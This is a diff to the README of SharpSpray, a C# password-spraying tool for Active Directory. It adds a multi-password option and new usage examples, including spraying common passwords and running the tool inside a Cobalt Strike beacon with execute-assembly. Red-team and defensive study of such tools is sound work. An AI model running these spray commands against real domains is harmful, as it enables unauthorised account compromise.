@@ -32,7 +32,7 @@ SharpSpray is a C# port of [DomainPasswordSpray](https://github.com/dafthack/Dom
   -v, --Verbose       Show verbose messages.
   -u                  (Optional) Username list file path. This will be
                       automatically fetched from the active directory if not specified.
-  -p                  A single password that will be used to perform the password spray.
+  -p                  A single password or a list splited by '|' that will be used to perform the password spray.
   -k, --pl            (Optional) Password List file path.
   -d                  (Optional) Specify a domain name.
   -m                  Use this option if spraying from a host located outside the Domain context.
@@ -56,6 +56,8 @@ SharpSpray is a C# port of [DomainPasswordSpray](https://github.com/dafthack/Dom
 ### Usage Examples
 ```
 SharpSpray.exe -v -x -z --pl password.txt
+SharpSpray.exe -v -x -z -p "Passw0rd|Admin@123|Admin@2022"
+SharpSpray.exe -v -x -z -p "Passw0rd"
 SharpSpray.exe -x -z -u users.txt --pl psswd.txt
 SharpSpray.exe -x -z -u users.txt -p Passw0rd!
 SharpSpray.exe -x -z -s 3 -j 1 -u users.txt -k psswd.txt -o sprayed.txt
@@ -66,6 +68,14 @@ SharpSpray.exe -w 32 -s 3 -j 1 -m -d DC-1.local --dc-ip 10.10.20.20 -u users.txt
 SharpSpray.exe --get-users-list
 SharpSpray.exe --get-users-list > users.txt
 PS> .\SharpSpray.exe --get-users-list | Out-File -Encoding ascii users.txt
+
+
+* Using in Cobalt Strike:
+beacon> execute-assembly C:\Users\sec\Desktop\tmp\sharpspray.exe --Force -w 32 -s 3 -j 1 -x -z -v -p "Passw0rd|Admin@123|Admin@2022"
+
+* Check Jobs in Cobalt:
+beacon> jobs
+
 ```
 
 ### Fetching only the users list from the Active Directory
